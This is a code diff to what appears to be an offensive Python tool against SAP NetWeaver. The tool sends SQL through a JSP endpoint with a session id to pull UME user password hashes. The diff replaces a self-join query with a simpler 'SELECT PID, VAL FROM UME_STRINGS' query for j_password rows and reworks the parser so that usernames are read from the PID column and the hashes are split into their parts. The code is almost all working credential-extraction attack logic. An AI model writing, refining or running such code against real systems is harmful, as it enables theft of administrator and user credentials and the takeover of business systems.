@@ -207,17 +207,12 @@ def invoke_jdbc_query(jsp_url: str, sid: str, query: str,
 # UME password hash extraction
 # ---------------------------------------------------------------------------
 
-# Pull (uniquename, j_password) pairs by joining UME_STRINGS to itself on PID
-# (they live under matching UACC.PRIVATE_DATASOURCE.un:<user> principals).
+# Direct query for j_password rows.  The username is encoded in the PID
+# column as `UACC.PRIVATE_DATASOURCE.un:<USERNAME>` — we parse it client-side
+# in parse_password_hashes() rather than join in SQL.  Simpler than the
+# self-join we previously used and works reliably across UME schema versions.
 UME_HASH_QUERY = (
-    "SELECT a.VAL AS USERNAME, b.VAL AS HASH "
-    "FROM UME_STRINGS a, UME_STRINGS b "
-    "WHERE a.PID = b.PID "
-    "AND a.NAMESP = 'com.sap.security.core.usermanagement' "
-    "AND a.ATTR = 'j_user' "
-    "AND b.NAMESP = 'com.sap.security.core.usermanagement' "
-    "AND b.ATTR = 'j_password' "
-    "AND b.VAL IS NOT NULL"
+    "SELECT PID, VAL FROM UME_STRINGS WHERE ATTR LIKE '%j_password%'"
 )
 
 # J2EE_CONFIGENTRY rows whose NAME suggests a credential.  These are already
@@ -243,15 +238,31 @@ def parse_password_hashes(query_result: dict) -> list:
     """
     hashes = []
     cols = [c.upper() for c in query_result.get("columns", [])]
-    try:
-        u_idx = cols.index("USERNAME")
-        h_idx = cols.index("HASH")
-    except ValueError:
+    # Two accepted shapes:
+    #   1. (USERNAME, HASH)            — from older self-joined query
+    #   2. (PID, VAL)                  — from `SELECT PID, VAL FROM
+    #                                     UME_STRINGS WHERE ATTR LIKE
+    #                                     '%j_password%'` — username is
+    #                                     embedded in PID (last segment
+    #                                     after the final colon)
+    if "USERNAME" in cols and "HASH" in cols:
+        u_idx, h_idx = cols.index("USERNAME"), cols.index("HASH")
+        pid_idx = -1
+    elif "PID" in cols and "VAL" in cols:
+        pid_idx = cols.index("PID")
+        h_idx   = cols.index("VAL")
+        u_idx   = -1
+    else:
         return hashes
     for row in query_result.get("rows", []):
-        if len(row) <= max(u_idx, h_idx):
+        if len(row) <= max(h_idx, max(u_idx, pid_idx)):
             continue
-        username = row[u_idx]
+        if pid_idx >= 0:
+            pid = row[pid_idx] or ""
+            # PID like "UACC.PRIVATE_DATASOURCE.un:Administrator"
+            username = pid.rsplit(":", 1)[-1] if ":" in pid else pid
+        else:
+            username = row[u_idx]
         full_hash = row[h_idx] or ""
         m = re.match(r"^\{([A-Za-z0-9\-]+)\s*,\s*(\d+)\s*,\s*(\d+)\}(.+)$",
                       full_hash.strip())
